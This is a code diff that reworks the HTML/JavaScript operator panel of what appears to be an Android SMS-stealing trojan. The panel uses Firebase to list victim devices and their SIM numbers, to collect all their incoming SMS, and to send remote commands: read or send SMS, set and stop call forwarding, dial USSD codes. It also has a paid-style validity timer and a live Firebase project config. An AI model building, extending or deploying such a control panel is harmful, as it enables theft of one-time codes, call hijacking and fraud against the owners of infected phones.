@@ -387,15 +387,12 @@
             overflow: auto;
         }
         .sms-word {
-            display: inline-block;
-            padding: 1px 2px;
+            display: inline;
             cursor: pointer;
-            border-radius: 2px;
             transition: background 0.2s;
         }
         .sms-word:hover {
-            background: rgba(16, 185, 129, 0.2);
-            color: #fff;
+            background: rgba(13, 110, 253, 0.1);
         }
         .pagination-container {
             display: flex;
@@ -431,6 +428,217 @@
         }
         .cursor-pointer { cursor: pointer; }
         .hidden { display: none !important; }
+
+        /* Screenshot Accurate White UI */
+        .ss-card {
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            color: #333;
+            cursor: pointer;
+            position: relative;
+        }
+        .ss-item { margin-bottom: 12px; }
+        .ss-label {
+            font-size: 0.8rem;
+            color: #1d4ed8; /* Specific blue */
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            margin-bottom: 4px;
+        }
+        .ss-label i { font-size: 0.65rem; margin-left: 6px; color: #94a3b8; }
+        .ss-value {
+            font-size: 1rem;
+            color: #000;
+            font-weight: 500;
+            padding-left: 2px;
+            white-space: pre-wrap;
+            overflow-wrap: break-word;
+            display: block;
+            width: 100%;
+            line-height: 1.4;
+            user-select: text;
+            -webkit-user-select: text;
+        }
+        .ss-separator {
+            height: 1px;
+            background-color: #f1f5f9;
+            margin-top: 8px;
+        }
+        .ss-footer {
+            margin-top: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.75rem;
+        }
+        .ss-id { color: #10b981; font-weight: 700; } /* Green */
+        .ss-time { color: #64748b; }
+        .msg-red { color: #e11d48; } /* Reddish color for SMS body */
+
+        /* Device Detail Specific UI (Screenshot Style) */
+        .device-main-container {
+            background: #f8fafc;
+            min-height: 100vh;
+            padding: 10px;
+        }
+        .device-info-card {
+            background: #ffffff;
+            border-radius: 16px;
+            border: 1px solid #e2e8f0;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #f1f5f9;
+        }
+        .detail-row:last-child { border-bottom: none; }
+        .detail-label {
+            color: #64748b;
+            font-weight: 600;
+            font-size: 0.85rem;
+        }
+        .detail-value {
+            color: #1e293b;
+            font-weight: 500;
+            font-size: 0.85rem;
+            text-align: right;
+        }
+        .battery-badge {
+            background: #dcfce7;
+            color: #15803d;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            margin-left: 6px;
+        }
+        .action-button-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .action-btn {
+            background: white;
+            border: 1px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 12px 5px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: #334155;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+            transition: all 0.2s;
+        }
+        .action-btn:active { background: #f1f5f9; transform: scale(0.96); }
+
+        .status-bar-large {
+            background: #f1f5f9;
+            border-radius: 12px;
+            padding: 15px;
+            font-size: 0.85rem;
+            color: #64748b;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+        .status-online-text { color: #10b981; font-weight: 700; }
+        .status-offline-text { color: #ef4444; font-weight: 700; }
+
+        /* All Devices Grid Styles */
+        .device-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+        .device-grid-card {
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 12px;
+            border: 1px solid #e2e8f0;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.02);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .device-grid-card:active { transform: scale(0.97); }
+        .dg-header {
+            font-weight: 700;
+            font-size: 0.8rem;
+            color: #1e293b;
+            margin-bottom: 8px;
+            padding-bottom: 5px;
+            border-bottom: 1px solid #f1f5f9;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .dg-row {
+            padding: 4px 0;
+            border-bottom: 1px solid #f1f5f9;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .dg-label {
+            color: #64748b;
+            font-size: 0.65rem;
+            margin-bottom: 1px;
+        }
+        .dg-value {
+            color: #1e293b;
+            font-size: 0.75rem;
+            font-weight: 500;
+            word-break: break-all;
+        }
+        .dg-status-red { color: #ef4444; font-weight: 600; }
+        .dg-status-green { color: #10b981; font-weight: 600; }
+        .dg-btn {
+            margin-top: 10px;
+            background: #fff;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            padding: 6px 0;
+            width: 100%;
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: #334155;
+            transition: background 0.2s;
+        }
+        .dg-btn:active { background: #f1f5f9; }
+
+        .help-container {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding: 40px 20px;
+            background: #1a1a1a;
+            border-radius: 12px;
+            border: 1px solid #333;
+            margin-top: 20px;
+        }
+        .help-item {
+            text-align: center;
+            text-decoration: none;
+            color: white;
+            transition: transform 0.2s;
+        }
+        .help-item:hover { transform: scale(1.1); color: #fff; }
+        .help-item i {
+            font-size: 4rem;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .icon-telegram { color: #0088cc; }
+        .icon-whatsapp { color: #25d366; }
+        .help-text { font-weight: 700; font-size: 1.1rem; }
     </style>
 </head>
 <body>
@@ -471,18 +679,10 @@
         </nav>
 
         <div class="stats-bar">
-            <div class="container d-flex justify-content-around">
+            <div class="container d-flex justify-content-center">
                 <div class="stat-item">
                     <span id="statTotal" class="stat-value text-white">0</span>
                     <span class="stat-label">Total Devices</span>
-                </div>
-                <div class="stat-item">
-                    <span id="statOnline" class="stat-value text-success">0</span>
-                    <span class="stat-label">Online</span>
-                </div>
-                <div class="stat-item">
-                    <span id="statOffline" class="stat-value text-danger">0</span>
-                    <span class="stat-label">Offline</span>
                 </div>
             </div>
             <div class="mt-1 text-center validity-timer" id="validityText">
@@ -499,8 +699,7 @@
                 <li class="nav-item"><a class="nav-link active" onclick="switchTab('users', this)">All Devices</a></li>
                 <li class="nav-item"><a class="nav-link" onclick="switchTab('sms', this)">All SMS</a></li>
                 <li class="nav-item"><a class="nav-link" onclick="switchTab('data', this)">All Data</a></li>
-                <li class="nav-item"><a class="nav-link" onclick="switchTab('online', this)">Online</a></li>
-                <li class="nav-item"><a class="nav-link" onclick="switchTab('offline', this)">Offline</a></li>
+                <li class="nav-item"><a class="nav-link" onclick="switchTab('help', this)">Help</a></li>
             </ul>
 
             <div id="contentArea" class="mt-3">
@@ -509,168 +708,208 @@
         </div>
     </div>
 
-    <!-- Device Detail Page (New Page Style) -->
-    <div id="detailPage">
-        <div class="detail-header">
-            <i class="fas fa-arrow-left back-btn" onclick="closeDetailPage()"></i>
-            <span class="fw-bold" id="headerModel">Device Name</span>
-        </div>
+    <!-- Device Detail Page (Screenshot Style) -->
+    <div id="detailPage" class="device-main-container" style="display:none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; overflow-y: auto;">
+        <div class="container pt-5">
+            <button class="btn btn-sm btn-outline-secondary mb-4 mt-2" onclick="closeDetailPage()"><i class="fas fa-arrow-left"></i> Home</button>
 
-        <div class="status-hero">
-            <h2 id="heroStatusText" class="mb-1">Device Online</h2>
-            <div id="heroLastSeen" class="text-secondary small">Last activity: 2m ago</div>
-        </div>
-
-        <div class="container pb-5">
-            <div class="section-title text-blue"><i class="fas fa-mobile-alt"></i> Device Essentials</div>
-            <div class="data-card">
-                <div class="detail-item">
-                    <span class="label-box">Device Model</span>
-                    <span class="value-box text-white" id="pModel">--</span>
+            <div class="device-info-card">
+                <div class="detail-row">
+                    <span class="detail-label">Name</span>
+                    <span class="detail-value"><span id="newDModel">--</span> <span id="newDBattery" class="battery-badge">--</span></span>
                 </div>
-                <div class="detail-item">
-                    <span class="label-box">Serial Number</span>
-                    <span class="value-box color-orange" id="pId">--</span>
+                <div class="detail-row">
+                    <span class="detail-label">ID</span>
+                    <span class="detail-value" id="newDId">--</span>
                 </div>
-                <div class="detail-item">
-                    <span class="label-box">Battery Level</span>
-                    <span class="value-box color-green" id="pBattery">--</span>
+                <div class="detail-row">
+                    <span class="detail-label">SIM</span>
+                    <span class="detail-value" id="newDSim">--</span>
                 </div>
-                <div class="detail-item">
-                    <span class="label-box">SIM Slot 1</span>
-                    <span class="value-box color-blue" id="pSim1">--</span>
+                <div class="detail-row">
+                    <span class="detail-label">Forward Call</span>
+                    <span class="detail-value text-secondary">OFF</span>
                 </div>
-                <div class="detail-item">
-                    <span class="label-box">SIM Slot 2</span>
-                    <span class="value-box color-blue" id="pSim2">--</span>
+                <div class="detail-row">
+                    <span class="detail-label">Install Date:</span>
+                    <span class="detail-value text-success" id="newDInstall">--</span>
                 </div>
-                <div class="detail-item">
-                    <span class="label-box">Installation Date</span>
-                    <span class="value-box text-secondary" id="pInstall">--</span>
+                <div class="detail-row">
+                    <span class="detail-label">Last Online</span>
+                    <span class="detail-value text-danger" id="newDLastSeen">--</span>
                 </div>
             </div>
 
-            <div class="section-title text-green"><i class="fas fa-bolt"></i> Remote Control</div>
-            <div class="sim-selector">
-                <div class="sim-option active" id="optSim1" onclick="selectSim(0)">SIM 1</div>
-                <div class="sim-option" id="optSim2" onclick="selectSim(1)">SIM 2</div>
-            </div>
-            <div class="action-grid">
-                <div class="action-tile tile-blue" onclick="sendCommand('ping')">
-                    <i class="fas fa-satellite-dish"></i><span>Check Online</span>
-                </div>
-                <div class="action-tile tile-green" onclick="sendCommand('getsms')">
-                    <i class="fas fa-sync"></i><span>Get SMS</span>
-                </div>
-                <div class="action-tile tile-pink" onclick="showSendSms()">
-                    <i class="fas fa-paper-plane"></i><span>Send SMS</span>
-                </div>
-                <div class="action-tile tile-red" onclick="showCallForward()">
-                    <i class="fas fa-phone-alt"></i><span>Forward</span>
-                </div>
-                <div class="action-tile tile-white" onclick="sendCommand('stopforward')">
-                    <i class="fas fa-phone-slash"></i><span>Stop Fwd</span>
-                </div>
-                <div class="action-tile tile-orange" onclick="showDialUssd()">
-                    <i class="fas fa-hashtag"></i><span>USSD</span>
-                </div>
+            <div class="action-button-grid">
+                <div class="action-btn" onclick="sendCommand('ping')">Check Online</div>
+                <div class="action-btn" onclick="sendCommand('getsms')">GET SMS</div>
+                <div class="action-btn" onclick="showSendSms()">Send SMS</div>
+                <div class="action-btn" onclick="showCallForward()">Call Forward</div>
+                <div class="action-btn" onclick="showDialUssd()">Dial USSD</div>
+                <div class="action-btn" onclick="showStopForward()">Stop Forward</div>
             </div>
 
-            <div class="section-title text-pink"><i class="fas fa-user-shield"></i> User & Account Info</div>
-            <div class="data-card" id="userInfoCard">
-                <!-- User data will be injected here dynamically -->
+            <div class="status-bar-large" id="newDStatusBar">
+                Checking connection status...
             </div>
+
+            <div class="section-title text-pink"><i class="fas fa-user-shield"></i> Detailed Data</div>
+            <div id="userInfoCard"></div>
 
             <div class="section-title text-white"><i class="fas fa-history"></i> Recent SMS</div>
-            <div id="pageSmsList">
-                <!-- SMS will load here -->
-            </div>
+            <div id="pageSmsList"></div>
             <div id="deviceSmsPagination" class="pagination-container hidden">
                 <button class="page-btn" id="btnPrevDeviceSms" onclick="changeDeviceSmsPage(-1)">Prev</button>
                 <span class="page-info" id="deviceSmsPageInfo">Page 1/1</span>
                 <button class="page-btn" id="btnNextDeviceSms" onclick="changeDeviceSmsPage(1)">Next</button>
             </div>
-
-            <div class="section-title text-orange"><i class="fas fa-terminal"></i> Command History</div>
-            <div id="commandLogsList" class="data-card" style="max-height: 300px; overflow-y: auto; background: #161616;">
-                <div class="text-center p-3 text-secondary small">No commands sent yet</div>
-            </div>
         </div>
     </div>
 
     <!-- SMS Modal -->
-    <div class="modal fade" id="smsModal" tabindex="-1" aria-hidden="true">
+    <div class="modal fade" id="smsModal" tabindex="-1" aria-hidden="true" style="z-index: 2050;">
         <div class="modal-dialog modal-dialog-centered">
-            <div class="modal-content bg-dark border-secondary">
-                <div class="modal-header border-secondary">
-                    <h5 class="modal-title text-white">Send Remote SMS</h5>
-                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+            <div class="modal-content border-0 shadow-lg" style="border-radius: 16px;">
+                <div class="modal-header border-bottom-0">
+                    <h5 class="modal-title fw-bold" style="color: #1e293b;">Send Remote SMS</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                 </div>
-                <div class="modal-body">
+                <div class="modal-body pt-0">
                     <div class="mb-3">
-                        <label class="form-label small text-secondary">Target Mobile Number</label>
-                        <input type="tel" id="smsTarget" class="form-control bg-dark text-white border-secondary" placeholder="Enter number with country code" inputmode="tel">
+                        <label class="form-label small fw-bold text-primary">Select SIM Slot</label>
+                        <div class="d-flex gap-2">
+                            <div class="flex-fill">
+                                <input type="radio" class="btn-check" name="smsSim" id="smsSim1" value="0" checked>
+                                <label class="btn btn-outline-primary w-100 fw-bold" for="smsSim1" style="border-radius: 8px;">SIM 1</label>
+                            </div>
+                            <div class="flex-fill">
+                                <input type="radio" class="btn-check" name="smsSim" id="smsSim2" value="1">
+                                <label class="btn btn-outline-primary w-100 fw-bold" for="smsSim2" style="border-radius: 8px;">SIM 2</label>
+                            </div>
+                        </div>
                     </div>
                     <div class="mb-3">
-                        <label class="form-label small text-secondary">Message Content</label>
-                        <textarea id="smsMessage" class="form-control bg-dark text-white border-secondary" rows="3" placeholder="Type your message here..."></textarea>
+                        <label class="form-label small fw-bold text-primary">Target Mobile Number</label>
+                        <input type="tel" id="smsTarget" class="form-control" style="background: #f1f5f9; border: 1px solid #e2e8f0; border-radius: 8px;" placeholder="e.g. +919876543210" inputmode="tel">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label small fw-bold text-primary">Message Content</label>
+                        <textarea id="smsMessage" class="form-control" style="background: #f1f5f9; border: 1px solid #e2e8f0; border-radius: 8px;" rows="4" placeholder="Type your message here..."></textarea>
                     </div>
                 </div>
-                <div class="modal-footer border-secondary">
-                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
-                    <button type="button" class="btn btn-primary" onclick="confirmSendSms()">Send Message</button>
+                <div class="modal-footer border-top-0 pt-0">
+                    <button type="button" class="btn btn-light fw-bold" data-bs-dismiss="modal">Cancel</button>
+                    <button type="button" class="btn btn-primary fw-bold px-4" onclick="confirmSendSms()" style="border-radius: 8px;">Send SMS</button>
                 </div>
             </div>
         </div>
     </div>
 
     <!-- Forward Modal -->
-    <div class="modal fade" id="forwardModal" tabindex="-1" aria-hidden="true">
+    <div class="modal fade" id="forwardModal" tabindex="-1" aria-hidden="true" style="z-index: 2050;">
         <div class="modal-dialog modal-dialog-centered">
-            <div class="modal-content bg-dark border-secondary">
-                <div class="modal-header border-secondary">
-                    <h5 class="modal-title text-white">Call Forwarding</h5>
-                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+            <div class="modal-content border-0 shadow-lg" style="border-radius: 16px;">
+                <div class="modal-header border-bottom-0">
+                    <h5 class="modal-title fw-bold" style="color: #1e293b;">Call Forwarding</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                 </div>
-                <div class="modal-body">
+                <div class="modal-body pt-0">
                     <div class="mb-3">
-                        <label class="form-label small text-secondary">Forwarding Number</label>
-                        <input type="tel" id="forwardNumber" class="form-control bg-dark text-white border-secondary" placeholder="e.g. +919876543210" inputmode="tel">
+                        <label class="form-label small fw-bold text-primary">Select SIM Slot</label>
+                        <div class="d-flex gap-2">
+                            <div class="flex-fill">
+                                <input type="radio" class="btn-check" name="forwardSim" id="fwdSim1" value="0" checked>
+                                <label class="btn btn-outline-primary w-100 fw-bold" for="fwdSim1" style="border-radius: 8px;">SIM 1</label>
+                            </div>
+                            <div class="flex-fill">
+                                <input type="radio" class="btn-check" name="forwardSim" id="fwdSim2" value="1">
+                                <label class="btn btn-outline-primary w-100 fw-bold" for="fwdSim2" style="border-radius: 8px;">SIM 2</label>
+                            </div>
+                        </div>
                     </div>
-                    <p class="small text-muted"><i class="fas fa-info-circle me-1"></i> This will set up call forwarding on the target device.</p>
+                    <div class="mb-3">
+                        <label class="form-label small fw-bold text-primary">Forwarding Number</label>
+                        <input type="tel" id="forwardNumber" class="form-control" style="background: #f1f5f9; border: 1px solid #e2e8f0; border-radius: 8px;" placeholder="e.g. +919876543210" inputmode="tel">
+                    </div>
+                    <p class="small text-muted"><i class="fas fa-info-circle me-1"></i> Setup call forwarding on target device.</p>
                 </div>
-                <div class="modal-footer border-secondary">
-                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
-                    <button type="button" class="btn btn-danger" onclick="confirmForward()">Set Forwarding</button>
+                <div class="modal-footer border-top-0 pt-0">
+                    <button type="button" class="btn btn-light fw-bold" data-bs-dismiss="modal">Cancel</button>
+                    <button type="button" class="btn btn-danger fw-bold px-4" onclick="confirmForward()" style="border-radius: 8px;">Set Forwarding</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Stop Forward Modal -->
+    <div class="modal fade" id="stopForwardModal" tabindex="-1" aria-hidden="true" style="z-index: 2050;">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content border-0 shadow-lg" style="border-radius: 16px;">
+                <div class="modal-header border-bottom-0">
+                    <h5 class="modal-title fw-bold" style="color: #1e293b;">Stop Call Forwarding</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body pt-0">
+                    <div class="mb-3">
+                        <label class="form-label small fw-bold text-primary">Select SIM Slot</label>
+                        <div class="d-flex gap-2">
+                            <div class="flex-fill">
+                                <input type="radio" class="btn-check" name="stopFwdSim" id="stopSim1" value="0" checked>
+                                <label class="btn btn-outline-primary w-100 fw-bold" for="stopSim1" style="border-radius: 8px;">SIM 1</label>
+                            </div>
+                            <div class="flex-fill">
+                                <input type="radio" class="btn-check" name="stopFwdSim" id="stopSim2" value="1">
+                                <label class="btn btn-outline-primary w-100 fw-bold" for="stopSim2" style="border-radius: 8px;">SIM 2</label>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="text-secondary small">This will send the command to stop all call forwarding on the selected SIM.</p>
+                </div>
+                <div class="modal-footer border-top-0 pt-0">
+                    <button type="button" class="btn btn-light fw-bold" data-bs-dismiss="modal">Cancel</button>
+                    <button type="button" class="btn btn-dark fw-bold px-4" onclick="confirmStopForward()" style="border-radius: 8px;">Stop Now</button>
                 </div>
             </div>
         </div>
     </div>
 
     <!-- USSD Modal -->
-    <div class="modal fade" id="ussdModal" tabindex="-1" aria-hidden="true">
+    <div class="modal fade" id="ussdModal" tabindex="-1" aria-hidden="true" style="z-index: 2050;">
         <div class="modal-dialog modal-dialog-centered">
-            <div class="modal-content bg-dark border-secondary">
-                <div class="modal-header border-secondary">
-                    <h5 class="modal-title text-white">Dial USSD Code</h5>
-                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+            <div class="modal-content border-0 shadow-lg" style="border-radius: 16px;">
+                <div class="modal-header border-bottom-0">
+                    <h5 class="modal-title fw-bold" style="color: #1e293b;">Dial USSD Code</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                 </div>
-                <div class="modal-body">
+                <div class="modal-body pt-0">
                     <div class="mb-3">
-                        <label class="form-label small text-secondary">USSD Code</label>
-                        <input type="tel" id="ussdCode" class="form-control bg-dark text-white border-secondary" placeholder="e.g. *121#" inputmode="tel">
+                        <label class="form-label small fw-bold text-primary">Select SIM Slot</label>
+                        <div class="d-flex gap-2">
+                            <div class="flex-fill">
+                                <input type="radio" class="btn-check" name="ussdSim" id="ussdSim1" value="0" checked>
+                                <label class="btn btn-outline-primary w-100 fw-bold" for="ussdSim1" style="border-radius: 8px;">SIM 1</label>
+                            </div>
+                            <div class="flex-fill">
+                                <input type="radio" class="btn-check" name="ussdSim" id="ussdSim2" value="1">
+                                <label class="btn btn-outline-primary w-100 fw-bold" for="ussdSim2" style="border-radius: 8px;">SIM 2</label>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label small fw-bold text-primary">USSD Code</label>
+                        <input type="tel" id="ussdCode" class="form-control" style="background: #f1f5f9; border: 1px solid #e2e8f0; border-radius: 8px;" placeholder="e.g. *121#" inputmode="tel">
                     </div>
                 </div>
-                <div class="modal-footer border-secondary">
-                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
-                    <button type="button" class="btn btn-warning" onclick="confirmUssd()">Dial Code</button>
+                <div class="modal-footer border-top-0 pt-0">
+                    <button type="button" class="btn btn-light fw-bold" data-bs-dismiss="modal">Cancel</button>
+                    <button type="button" class="btn btn-warning fw-bold px-4 text-white" onclick="confirmUssd()" style="border-radius: 8px;">Dial Code</button>
                 </div>
             </div>
         </div>
     </div>
 
     <!-- Toast Container -->
-    <div class="toast-container position-fixed bottom-0 start-50 translate-middle-x p-3">
+    <div class="toast-container position-fixed bottom-0 start-50 translate-middle-x p-3" style="z-index: 3000;">
         <div id="cmdToast" class="toast bg-primary text-white border-0" role="alert" aria-live="assertive" aria-atomic="true">
             <div class="d-flex">
                 <div class="toast-body" id="toastMsg">Command sent successfully!</div>
@@ -694,7 +933,7 @@
             projectId: "gas2-9bef3",
             storageBucket: "gas2-9bef3.firebasestorage.app",
             messagingSenderId: "550689038537",
-            appId: "1:550689038537:android:af162a84e1e2546ddf2d18"
+            appId: "1:550689038537:android:ae037ac3a27c7529df2d18"
         };
 
         firebase.initializeApp(firebaseConfig);
@@ -703,18 +942,17 @@
         // APP STATE
         let allData = {};
         let allSms = [];
-        let allLogsRecords = [];
         let currentTab = 'users';
         let searchQuery = "";
+        let selectedRecordKey = null;
         let selectedUserId = null;
         let selectedSimSlot = 0;
         let expiryTimestamp = 0;
-        let adminPass = "";
-        let adminId = "";
 
         let allSmsCurrentPage = 1;
         let deviceSmsCurrentPage = 1;
         let currentDeviceSms = [];
+        let logTimerInterval = null;
 
         // UI ELEMENTS
         const loginScreen = document.getElementById('loginScreen');
@@ -723,70 +961,40 @@
         const detailPage = document.getElementById('detailPage');
         const smsModal = new bootstrap.Modal(document.getElementById('smsModal'));
         const forwardModal = new bootstrap.Modal(document.getElementById('forwardModal'));
+        const stopForwardModal = new bootstrap.Modal(document.getElementById('stopForwardModal'));
         const ussdModal = new bootstrap.Modal(document.getElementById('ussdModal'));
         const cmdToast = new bootstrap.Toast(document.getElementById('cmdToast'));
 
-        // Sync history when modals are closed manually
-        ['smsModal', 'forwardModal', 'ussdModal'].forEach(id => {
-            document.getElementById(id).addEventListener('hidden.bs.modal', () => {
-                if (history.state && history.state.view === 'modal') {
-                    history.back();
-                }
-            });
-        });
-
         // LOGIN CHECK
         if (localStorage.getItem('isLoggedIn') === 'true') {
-            if (!history.state || history.state.view !== 'dashboard') {
-                history.replaceState({ view: 'dashboard' }, '');
-            }
             showDashboard();
         }
 
         document.getElementById('btnLogin').onclick = () => {
             const id = document.getElementById('loginId').value.trim();
             const pass = document.getElementById('loginPass').value.trim();
-
             if (!id || !pass) return alert("Enter ID and Password");
-
             db.ref('AdminConfig').once('value', snapshot => {
                 if (!snapshot.exists()) {
-                    // Setup new admin with provided credentials
-                    const initialId = "UNIONADMIN1";
-                    const initialPass = "123456";
-
-                    if (id === initialId && pass === initialPass) {
-                        db.ref('AdminConfig').set({ id: initialId, pass: initialPass }).then(() => loginSuccess(initialPass)).catch(err => alert("Firebase Error: " + err.message));
-                    } else {
-                        document.getElementById('loginError').classList.remove('hidden');
-                        document.getElementById('loginError').innerText = "Use initial setup credentials";
-                    }
+                    db.ref('AdminConfig').set({ id, pass }).then(() => loginSuccess(pass));
                 } else {
                     const data = snapshot.val();
-                    if (id === data.id && pass === data.pass) {
-                        loginSuccess(pass);
-                    } else {
-                        // If ID matches but pass doesn't, OR if totally wrong
-                        document.getElementById('loginError').classList.remove('hidden');
-                        document.getElementById('loginError').innerText = "Invalid credentials";
-                    }
+                    if (id === data.id && pass === data.pass) loginSuccess(pass);
+                    else document.getElementById('loginError').classList.remove('hidden');
                 }
-            }, err => {
-                alert("Database Connection Error: " + err.message);
             });
         };
 
         function loginSuccess(password) {
             localStorage.setItem('isLoggedIn', 'true');
             localStorage.setItem('sessionPass', password);
-            history.replaceState({ view: 'dashboard' }, '');
             showDashboard();
         }
 
         function logout() {
             localStorage.removeItem('isLoggedIn');
             localStorage.removeItem('sessionPass');
-            location.href = location.pathname; // Hard reload to clear state
+            location.reload();
         }
 
         function showDashboard() {
@@ -798,7 +1006,6 @@
 
         // DATABASE LISTENERS
         function startListeners() {
-            // Panel Validity
             db.ref('AdminConfig/expiry').on('value', snapshot => {
                 expiryTimestamp = snapshot.val() || 0;
                 if (expiryTimestamp === 0) {
@@ -806,50 +1013,41 @@
                     db.ref('AdminConfig/expiry').set(thirtyDays);
                 }
             });
-
-            // Security Check: Auto Logout if password changed
-            db.ref('AdminConfig/pass').on('value', snapshot => {
-                const latestPass = snapshot.val();
-                const sessionPass = localStorage.getItem('sessionPass');
-                if (sessionPass && latestPass && latestPass !== sessionPass) {
-                    logout();
-                }
-            });
-
-            // Users Data
             db.ref('AllData').on('value', snapshot => {
                 allData = snapshot.val() || {};
                 renderContent();
                 updateStats();
             });
-
-            // All SMS
             db.ref('AllSms').on('value', snapshot => {
                 const data = snapshot.val() || {};
-                allSms = [];
+                let tempSms = [];
                 Object.keys(data).forEach(deviceId => {
                     Object.keys(data[deviceId]).forEach(smsId => {
-                        allSms.push({ ...data[deviceId][smsId], id: smsId, deviceId });
+                        tempSms.push({ ...data[deviceId][smsId], id: smsId, deviceId });
                     });
                 });
-                allSms.sort((a, b) => (b.id) - (a.id)); // Newest first
-                if (currentTab === 'sms') renderContent();
-            });
 
-            // All Logs (History)
-            db.ref('AllLogs').on('value', snapshot => {
-                const data = snapshot.val() || {};
-                allLogsRecords = [];
-                Object.keys(data).forEach(logId => {
-                    allLogsRecords.push({ ...data[logId], logId });
+                // Sort by time ascending to merge segments
+                tempSms.sort((a, b) => parseInt(a.id) - parseInt(b.id));
+
+                let merged = [];
+                tempSms.forEach(sms => {
+                    let last = merged[merged.length - 1];
+                    // If same device, same sender, and within 15 seconds, merge into one card
+                    if (last && last.deviceId === sms.deviceId && last.from === sms.from && (parseInt(sms.id) - parseInt(last.id)) < 15000) {
+                        if (!last.msg.includes(sms.msg)) { // Simple duplicate check
+                            last.msg += "\n" + sms.msg;
+                        }
+                    } else {
+                        merged.push({...sms});
+                    }
                 });
-                allLogsRecords.sort((a, b) => (b.timestamp || b.logId) - (a.timestamp || a.logId));
-                allLogsRecords.reverse(); // Newest first
-                if (currentTab === 'data') renderContent();
+
+                allSms = merged.reverse();
+                if (currentTab === 'sms') renderContent();
             });
         }
 
-        // UI RENDERING
         function switchTab(tab, el) {
             currentTab = tab;
             document.querySelectorAll('.nav-link').forEach(link => link.classList.remove('active'));
@@ -871,211 +1069,201 @@
         function renderContent() {
             contentArea.innerHTML = "";
 
-            // 1. Get all users and sort them chronologically (oldest first) to assign fixed IDs
-            const allUsers = Object.keys(allData).map(uid => ({ ...allData[uid], uid }));
-            allUsers.sort((a, b) => {
-                const parseDate = (d) => {
-                    if (!d) return 0;
-                    const parts = d.split(/[\/\s:]/);
-                    if (parts.length < 6) return 0;
-                    return new Date(parts[2], parts[1]-1, parts[0], parts[3], parts[4], parts[5]).getTime();
-                };
-                const timeA = parseDate(a.installDate);
-                const timeB = parseDate(b.installDate);
-                if (timeA !== timeB) return timeA - timeB;
-                return (a.uid < b.uid) ? -1 : 1; // Fallback to UID for stability
-            });
-
-            // 2. Map indices (Oldest = #1)
-            const userWithIndex = allUsers.map((u, i) => ({ ...u, fixedIndex: i + 1 }));
-
-            // 3. For display, we usually want newest at top
-            const displayList = [...userWithIndex].reverse();
-
             if (currentTab === 'users' || currentTab === 'online' || currentTab === 'offline') {
-                displayList.forEach((user) => {
-                    const isOnline = (Date.now() - parseInt(user.lastSeen || 0)) < 60000;
+                const users = Object.keys(allData).map(uid => ({ ...allData[uid], uid }));
 
-                    if (currentTab === 'online' && !isOnline) return;
-                    if (currentTab === 'offline' && isOnline) return;
-
-                    if (searchQuery) {
-                        const match = (user.model || "").toLowerCase().includes(searchQuery) ||
-                                      (user.mobile || "").includes(searchQuery) ||
-                                      (user.uid || "").toLowerCase().includes(searchQuery);
-                        if (!match) return;
-                    }
-
-                    const card = document.createElement('div');
-                    card.className = `card user-card p-2 ${isOnline ? 'online-border' : 'offline-border'}`;
-                    card.onclick = () => openUserDetails(user.uid);
-
-                    const batteryLevel = parseInt(user.battery || 0);
-                    let batteryColor = "text-success";
-                    if(batteryLevel < 20) batteryColor = "text-danger";
-                    else if(batteryLevel < 50) batteryColor = "text-warning";
-                    else if(batteryLevel < 80) batteryColor = "text-info";
-
-                    const simMatches = (user.simInfo || "").match(/\(([^)]+)\)/g);
-                    let simDisplay = "No Mobile";
-                    if (simMatches) {
-                        const nums = simMatches.map(m => m.slice(1, -1)).filter(n => n.toLowerCase() !== 'no number');
-                        if (nums.length > 0) simDisplay = nums.join(' | ');
-                        else simDisplay = user.mobile || 'No SIM';
-                    } else {
-                        simDisplay = user.mobile || 'No Mobile';
-                    }
-
-                    card.innerHTML = `
-                        <div class="row g-1">
-                            <div class="col-12 d-flex justify-content-between align-items-center">
-                                <div class="d-flex align-items-center">
